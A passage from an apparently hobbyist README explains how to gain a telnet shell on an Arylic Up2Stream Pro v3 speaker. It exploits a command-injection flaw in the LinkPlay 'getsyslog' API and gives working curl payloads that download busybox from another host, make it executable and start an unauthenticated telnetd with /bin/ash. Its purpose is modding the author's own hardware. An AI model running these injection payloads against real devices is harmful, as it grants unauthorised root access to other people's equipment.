# Enable telnetd
To enable telnetd on these devices, a security vulnerability had to be exploited. The first version on my devices was 4.2.8020 from 2020/02/20 (20th of Feb 2020) that still had a vulnerability in their code: internally a "sprintf" function was used to prepare a Linux CLI commands. That function was using an IP address as an input, but the input could be extended with ";" and additional commands to download and install a telnetd.

The command that has this vulnerability is **_"getsyslog"_**, see https://developer.arylic.com/httpapi/#get-system-log and https://labs.withsecure.com/advisories/linkplay-firmware-wanlan-remote-code-execution. The command has an option to add an IP address from a slave device, e.g. **_"getsyslog:ip:10.1.1.90"_**, so a CLI command is executed on the device to retrieve the system log from the slave device that includes the IP address. Instead of just having an IP address as a parameter, that CLI command can also include a ";" and a second CLI command. You do not even have to provide an IP address, but can append the ";" and second command directly after the ":ip:". 

The following code snippets are using the IP address 10.1.1.52 for my Arylic Up2Stream Pro v3 device and 10.1.1.22 for a web server running on my local MacBook. 
```
curl "http://10.1.1.52httpapi.asp?command=getsyslog:ip:;wget+-O+/tmp/bin/busybox+-T+5+http://10.1.1.22/a31/busybox+-q;chmod+777+/tmp/bin/busybox;/tmp/bin/busybox+telnetd+-l/bin/ash";
```
The command above is executing the following commands on the device:
```
wget -O /tmp/bin/busybox -T 5 http://10.1.1.22/a31/busybox -q;
chmod 777 /tmp/bin/busybox;
/tmp/bin/busybox telnetd -l/bin/ash
```
The tool **_"busybox"_** is like a swiss army knife and combines a lot of CLI commands in a single binary file. That file was stripped down already in my version and does not include a telnetd anymore. Therefore you have to get a full version from somewhere. 

A version of busybox is provided here, but there is an OpenWRT archive where you can get precompiled binaries for almost all utilities you may need. See section **_Hardware and Firmware_** for more information.

You may also redirect output and error output for telnetd: 
```
curl "http://10.1.1.52httpapi.asp?command=getsyslog:ip:10.1.1.22/index.html;wget+-O+/tmp/bin/busybox+-T+5+http://10.1.1.22/a31/busybox+-q;chmod+777+/tmp/bin/busybox;/tmp/bin/busybox+telnetd+-l/bin/ash+>+/tmp/web/cmd.out+2>+/tmp/web/cmd.err;";
```

